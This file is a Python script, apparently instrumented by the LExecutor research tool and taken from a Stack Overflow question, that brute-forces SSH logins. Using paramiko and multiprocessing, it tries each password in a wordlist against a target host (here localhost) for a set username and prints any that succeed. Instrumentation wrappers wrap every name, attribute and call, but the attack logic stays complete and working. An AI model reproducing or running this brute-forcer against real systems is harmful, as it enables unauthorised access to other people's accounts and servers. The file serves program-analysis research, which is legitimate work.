# LExecutor: DO NOT INSTRUMENT

#Source: https://stackoverflow.com/questions/52905353/python-multiprocessing-typeerror-pickling-an-authenticationstring
from lexecutor.Runtime import _n_
from lexecutor.Runtime import _a_
from lexecutor.Runtime import _c_
from lexecutor.Runtime import _l_
try:
    import paramiko
    _l_(574046)

except ImportError:
    pass
try:
    from multiprocessing import Queue, Process
    _l_(574048)

except ImportError:
    pass

TARGET_IP = 'localhost'
_l_(574049)
USERNAME = 'richardcurteis'
_l_(574050)
WORDLIST = 'test2.txt'
_l_(574051)
MAX_THREADS = 10
_l_(574052)
processes = []
_l_(574053)
found = []
_l_(574054)
q = _c_(574056, _n_(574055, "Queue", lambda: Queue))
_l_(574057)


def ssh_connect(target_ip, username, password):
    _l_(574101)

    ssh = _c_(574060, _a_(574059, _n_(574058, "paramiko", lambda: paramiko), "SSHClient"))
    _l_(574061)
    _c_(574066, _a_(574063, _n_(574062, "ssh", lambda: ssh), "set_missing_host_key_policy"), _a_(574065, _n_(574064, "paramiko", lambda: paramiko), "AutoAddPolicy"))
    _l_(574067)

    try:
        _l_(574099)

        _c_(574073, _a_(574069, _n_(574068, "ssh", lambda: ssh), "connect"), _n_(574070, "target_ip", lambda: target_ip), username=_n_(574071, "username", lambda: username), password=_n_(574072, "password", lambda: password))
        _l_(574074)
        _c_(574078, _a_(574076, _n_(574075, "found", lambda: found), "append"), _n_(574077, "password", lambda: password))
        _l_(574079)
        _c_(574083, _a_(574081, _n_(574080, "q", lambda: q), "put"), _n_(574082, "password", lambda: password))
        _l_(574084)
    except _a_(574087, _a_(574086, _n_(574085, "paramiko", lambda: paramiko), "ssh_exception"), "AuthenticationException"):
        _l_(574093)

        _c_(574090, _n_(574088, "print", lambda: print), "[*] Failed: ", _n_(574089, "password", lambda: password))
        _l_(574091)
        aux = False
        _l_(574092)
        return aux
    finally:
        _l_(574098)

        _c_(574096, _a_(574095, _n_(574094, "ssh", lambda: ssh), "close"))
        _l_(574097)
    aux = True
    _l_(574100)

    return aux


def close_threads(abort=False):
    _l_(574120)

    for p in _n_(574102, "processes", lambda: processes):
        _l_(574115)

        _c_(574105, _a_(574104, _n_(574103, "p", lambda: p), "join"))
        _l_(574106)
        if _n_(574107, "abort", lambda: abort):
            _l_(574114)

            for x in _n_(574108, "processes", lambda: processes):
                _l_(574113)

                _c_(574111, _a_(574110, _n_(574109, "x", lambda: x), "terminate"))
                _l_(574112)

    _c_(574118, _a_(574117, _n_(574116, "processes", lambda: processes), "clear"))
    _l_(574119)


def main():
    _l_(574198)


    with _c_(574123, _n_(574121, "open", lambda: open), _n_(574122, "WORDLIST", lambda: WORDLIST)) as input_handle:
        _l_(574197)

        process_count = 0
        _l_(574124)
        for line in _n_(574125, "input_handle", lambda: input_handle):
            _l_(574180)

            try:
                _l_(574179)

                password = _c_(574128, _a_(574127, _n_(574126, "line", lambda: line), "rstrip"))
                _l_(574129)
                p = _c_(574135, _n_(574130, "Process", lambda: Process), target=_n_(574131, "ssh_connect", lambda: ssh_connect), args=[_n_(574132, "TARGET_IP", lambda: TARGET_IP), _n_(574133, "USERNAME", lambda: USERNAME), _n_(574134, "password", lambda: password)])
                _l_(574136)
                _c_(574140, _a_(574138, _n_(574137, "processes", lambda: processes), "append"), _n_(574139, "p", lambda: p))
                _l_(574141)
                _c_(574144, _a_(574143, _n_(574142, "p", lambda: p), "start"))
                _l_(574145)
                _c_(574149, _a_(574147, _n_(574146, "q", lambda: q), "put"), _n_(574148, "p", lambda: p))
                _l_(574150)
                process_count += 1
                _l_(574151)

                if not _c_(574154, _a_(574153, _n_(574152, "q", lambda: q), "empty")):
                    _l_(574156)

                    break
                    _l_(574155)
                if _n_(574157, "process_count", lambda: process_count) >= _n_(574158, "MAX_THREADS", lambda: MAX_THREADS):
                    _l_(574163)

                    _c_(574160, _n_(574159, "close_threads", lambda: close_threads))
                    _l_(574161)
                    process_count = 0
                    _l_(574162)

            except _n_(574164, "KeyboardInterrupt", lambda: KeyboardInterrupt):
                _l_(574169)

                _c_(574166, _n_(574165, "print", lambda: print), "[!] Interrupted by user")
                _l_(574167)
                break
                _l_(574168)
            except (_n_(574170, "ConnectionResetError", lambda: ConnectionResetError), _a_(574173, _a_(574172, _n_(574171, "paramiko", lambda: paramiko), "ssh_exception"), "SSHException")):
                _l_(574178)

                _c_(574175, _n_(574174, "print", lambda: print), "[X] Connection reset by target. Reduce thread count")
                _l_(574176)
                break
                _l_(574177)

        _c_(574182, _n_(574181, "close_threads", lambda: close_threads))
        _l_(574183)

        if _c_(574186, _n_(574184, "len", lambda: len), _n_(574185, "found", lambda: found)) > 0:
            _l_(574196)

            for c in _n_(574187, "found", lambda: found):
                _l_(574192)

                _c_(574190, _n_(574188, "print", lambda: print), "[!] Found: ", _n_(574189, "c", lambda: c))
                _l_(574191)
        else:
            _c_(574194, _n_(574193, "print", lambda: print), "[*] Pass not found")
            _l_(574195)


if _n_(574199, "__name__", lambda: __name__) == '__main__':
    _l_(574203)

    _c_(574201, _n_(574200, "main", lambda: main))
    _l_(574202)